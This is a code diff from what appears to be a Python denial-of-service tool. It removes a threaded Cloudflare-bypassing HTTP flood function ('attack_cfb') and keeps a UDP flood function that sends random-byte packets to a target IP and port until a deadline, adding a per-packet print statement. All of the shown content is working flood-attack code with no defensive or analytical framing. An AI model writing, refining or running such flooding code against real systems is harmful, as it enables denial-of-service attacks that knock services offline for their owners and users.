@@ -45,32 +45,8 @@ def detect_max_packets():
 
 
 
-# layer 4 
-def launch_cfb(url, end_time, th=15):
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=attack_cfb, args=(url, end_time))
-            thd.start()
-        except Exception as e:
-            print(f"Error launching thread: {e}")
-
-def attack_cfb(url, end_time):
-    max_packets = detect_max_packets()
-    scraper = cloudscraper.create_scraper()
-
-    while time.time() < end_time:
-        try:
-            packets_sent = 0
-            while time.time() < end_time and packets_sent < max_packets:
-                scraper.get(url, timeout=15)
-                scraper.get(url, timeout=15)
-                packets_sent += 1
-        except Exception as e:
-            print("Error:", e)
-            continue
-
 def attack_udp(ip, port, end_time, size):
-    print("attack started")
+    print("Attack started")
     max_packets = detect_max_packets()
     
     while time.time() < end_time:
@@ -80,6 +56,7 @@ def attack_udp(ip, port, end_time, size):
             packets_sent = 0
             while time.time() < end_time and packets_sent < max_packets:
                 data = os.urandom(size)
+                print(f"Sending packet to {ip}:{dport}, size={size} bytes")
                 s.sendto(data, (ip, dport))
                 packets_sent += 1
         except Exception as e:
